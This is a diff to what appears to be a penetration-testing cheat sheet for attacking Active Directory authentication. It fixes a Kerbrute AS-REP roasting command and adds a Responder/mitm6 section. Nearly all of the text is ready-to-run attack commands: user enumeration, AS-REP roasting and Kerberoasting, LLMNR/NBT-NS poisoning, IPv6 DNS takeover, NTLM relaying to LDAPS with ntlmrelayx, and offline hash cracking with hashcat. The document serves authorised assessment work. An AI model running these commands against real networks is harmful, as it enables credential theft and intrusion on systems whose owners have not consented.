@@ -14,9 +14,11 @@ Abuses Kerberos AS-REQ pre-auth responses: `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` = u
 # User enumeration
 ./kerbrute userenum -d corp.local --dc 192.168.56.101 usernames.txt -o valid_users.txt
 
-# AS-REP roasting sweep — dumps hashcat-crackable AS-REP (mode 18200) for any account with preauth disabled
-./kerbrute asreproast -d corp.local --dc 192.168.56.101 users.txt -o asrep_hashes.txt
+# AS-REP roasting sweep — kerbrute has no dedicated 'asreproast' subcommand; userenum's
+# --hash-file flag captures hashcat-crackable AS-REP (mode 18200) for any account with preauth disabled
+./kerbrute userenum -d corp.local --dc 192.168.56.101 users.txt --hash-file asrep_hashes.txt
 hashcat -m 18200 asrep_hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule
+# Alternatives: Impacket's GetNPUsers.py, or nxc's --asreproast flag (see NetExec section below)
 
 # Password spraying via Kerberos pre-auth — faster/quieter than SMB/LDAP binds,
 # but STILL counts against lockout policy; --safe aborts on lockout signal
@@ -39,6 +41,23 @@ nxc ldap DC01.corp.local -u lowpriv -p 'Passw0rd!' --asreproast asrep_out.txt   
 nxc ldap DC01.corp.local -u lowpriv -p 'Passw0rd!' --kerberoasting kerberoast_out.txt  # hashcat mode 13100
 ```
 **Reference:** https://github.com/Pennyw0rth/NetExec · https://www.netexec.wiki/
+
+## Responder / mitm6 — network hash capture (LLMNR/NBT-NS/mDNS + IPv6 DNS takeover)
+
+Captures Net-NTLMv2 challenge/response hashes from broadcast name-resolution traffic without needing any prior credential — often the very first crackable hash on an internal AD assessment.
+```bash
+# Responder — poison LLMNR/NBT-NS/mDNS, log Net-NTLMv2 to /usr/share/responder/logs/
+sudo responder -I eth0 -wrf
+
+# mitm6 — IPv6 DNS takeover, forces Windows hosts to prefer attacker as DNS/WPAD over IPv6
+sudo mitm6 -d corp.local
+# pair with ntlmrelayx to relay the captured auth instead of just logging it
+sudo ntlmrelayx.py -6 -t ldaps://192.168.56.101 -wh fakewpad.corp.local -l loot
+
+# Crack captured Net-NTLMv2 hashes offline
+hashcat -m 5600 ntlmv2_hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule
+```
+**Reference:** https://github.com/lgandx/Responder · https://github.com/dirkjanm/mitm6
 
 ## Hydra — service-specific brute force
 
@@ -93,6 +112,8 @@ john --wordlist=rockyou.txt --rules=OneRule hashes.txt
 |---|---|
 | Kerbrute | https://github.com/ropnop/kerbrute |
 | NetExec (nxc) | https://github.com/Pennyw0rth/NetExec (docs: https://www.netexec.wiki/) |
+| Responder | https://github.com/lgandx/Responder |
+| mitm6 | https://github.com/dirkjanm/mitm6 |
 | CrackMapExec (legacy, archived — do not use) | https://github.com/byt3bl33d3r/CrackMapExec |
 | THC-Hydra | https://github.com/vanhauser-thc/thc-hydra |
 | John the Ripper (jumbo) | https://github.com/openwall/john |
